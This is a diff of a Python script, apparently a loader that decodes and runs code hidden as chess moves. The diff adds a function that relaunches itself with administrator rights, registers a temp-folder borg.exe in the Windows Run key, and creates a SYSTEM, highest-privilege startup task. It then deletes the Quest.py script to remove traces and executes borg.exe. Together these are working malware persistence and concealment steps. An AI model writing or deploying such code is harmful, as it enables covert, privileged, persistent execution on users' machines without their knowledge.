@@ -55,50 +55,121 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
 
 # Function to add the executable to Windows startup and Task Scheduler
 def add_to_startup_and_task_scheduler(executable_path, app_name="BorgApp"):
-    try:
-        # Step 1: Add to Windows startup via registry
+    """Add the executable to both the startup registry and Task Scheduler, with automatic elevation."""
+    
+    def is_admin():
+        """Check if the script is running with admin rights."""
         try:
-            # Open the registry key for the current user's startup programs, or create it if it doesn't exist
-            with winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run",
-                0,
-                winreg.KEY_SET_VALUE
-            ) as key:
-                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
-                print(f"Successfully added {executable_path} to registry startup.")
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
 
-            # Verify the registry key value
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
-                value, _ = winreg.QueryValueEx(key, app_name)
-                print(f"Registry Key Value for {app_name}: {value}")
-
+    def run_as_admin():
+        """Attempt to relaunch the script with elevated privileges."""
+        try:
+            # Re-launch the script with admin privileges
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
+            sys.exit(0)  # Exit the current script after launching the elevated one
         except Exception as e:
-            print(f"Failed to add {executable_path} to registry startup: {e}")
-            print(traceback.format_exc())
-            return  # Exit early if registry setup fails
+            print(f"Failed to elevate script: {e}")
+            sys.exit(1)
 
-        # Step 2: Add to Task Scheduler using the registry entry for the path to 'borg.exe'
-        if value:  # Ensure we successfully retrieved the registry value
-            cmd = [
-                'schtasks', '/Create', '/F',
-                '/SC', 'ONSTART',  # Trigger on system startup
-                '/TN', app_name,  # Task name
-                '/TR', f'"{value}"',  # Use the path from the registry
-                '/RU', 'SYSTEM',  # Run as SYSTEM user to ensure elevated privileges               
-            ]
+    # Step 1: Elevate permissions if not running as admin
+    if not is_admin():
+        print("Not running as admin. Elevating permissions...")
+        run_as_admin()
 
-            print(f"Running Task Scheduler command: {' '.join(cmd)}")
-            result = subprocess.run(cmd, capture_output=True, text=True)
+    # Get the temp directory path for borg.exe
+    user_temp_dir = tempfile.gettempdir()
+    borg_exe_path = os.path.join(user_temp_dir, 'borg.exe')
+    quest_script_path = os.path.join(os.getcwd(), 'binar', 'Quest.py')  # Ensure correct relative path to Quest.py
 
-            if result.returncode == 0:
-                print(f"Successfully added {executable_path} to Task Scheduler using the registry path.")
-            else:
-                print(f"Failed to add task to Task Scheduler. Error: {result.stderr}")
+    # Step 2: Audit the paths to ensure correctness
+    try:
+        if not os.path.isdir(user_temp_dir) or not os.path.isdir(os.path.join(os.getcwd(), 'binar')):
+            print("Uh hey we may have a problem with the directories:")
+            print(f"Current working directory: {os.getcwd()}")
+            print(f"Real path of cwd: {os.path.realpath(os.getcwd())}")
+            print(f"User temp dir: {user_temp_dir}")
+            print(f"borg.exe path: {borg_exe_path}")
+            return  # Exit function if paths are not valid
         else:
-            print(f"Failed to retrieve the registry path for {app_name}.")
+            print("Path audit passed, no problems detected.")
     except Exception as e:
-        print(f"Failed to add {executable_path} to startup and Task Scheduler: {e}")
+        print(f"Path audit error: {e}")
+        print(traceback.format_exc())
+        return  # Exit function in case of path-related issues
+
+    print(f"\nAttempting to add {borg_exe_path} to startup and Task Scheduler...")
+
+    # Step 3: Add to Windows startup via registry
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        ) as key:
+            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, borg_exe_path)
+            print(f"Successfully added {borg_exe_path} to registry startup.")
+
+        # Verify the registry key value
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
+            value, _ = winreg.QueryValueEx(key, app_name)
+            print(f"Registry Key Value for {app_name}: {value}")
+
+    except Exception as e:
+        print(f"Failed to add {borg_exe_path} to registry startup: {e}")
+        print(traceback.format_exc())
+        return  # Exit early if registry setup fails
+
+    # Step 4: Add to Task Scheduler using the registry entry for the path to 'borg.exe'
+    if value:
+        cmd = [
+            'schtasks', '/Create', '/F',
+            '/SC', 'ONSTART',  # Trigger on system startup
+            '/TN', app_name,  # Task name
+            '/TR', f'"{value}"',  # Use the path from the registry
+            '/RU', 'SYSTEM',  # Run as SYSTEM user to ensure elevated privileges
+            '/RL', 'HIGHEST'  # Run with the highest privileges
+        ]
+
+        print(f"Running Task Scheduler command: {' '.join(cmd)}")
+        result = subprocess.run(cmd, capture_output=True, text=True)
+
+        if result.returncode == 0:
+            print(f"Successfully added {borg_exe_path} to Task Scheduler using the registry path.")
+        else:
+            print(f"Failed to add task to Task Scheduler. Error: {result.stderr}")
+    else:
+        print(f"Failed to retrieve the registry path for {app_name}.")
+
+    # Step 5: Clean up Quest.py after adding to startup but before executing borg.exe
+    try:
+        if os.path.exists(quest_script_path):
+            print(f"Deleting {quest_script_path} before executing {borg_exe_path}...")
+            os.remove(quest_script_path)
+            print(f"{quest_script_path} has been deleted.")
+        else:
+            print(f"{quest_script_path} not found, skipping deletion.")
+    except Exception as e:
+        print(f"Error during Quest.py cleanup: {e}")
+        print(traceback.format_exc())
+
+    # Step 6: Execute borg.exe after cleanup
+    try:
+        print(f"\nAttempting to execute {borg_exe_path}...")
+        process = subprocess.Popen([borg_exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+
+        if process.returncode == 0:
+            print(f"{borg_exe_path} executed successfully.")
+            print(stdout.decode('utf-8'))
+        else:
+            print(f"Execution failed with return code {process.returncode}.")
+            print(stderr.decode('utf-8'))
+    except Exception as e:
+        print(f"Failed to run {borg_exe_path}: {e}")
         print(traceback.format_exc())
 
 # Chess moves representing the code
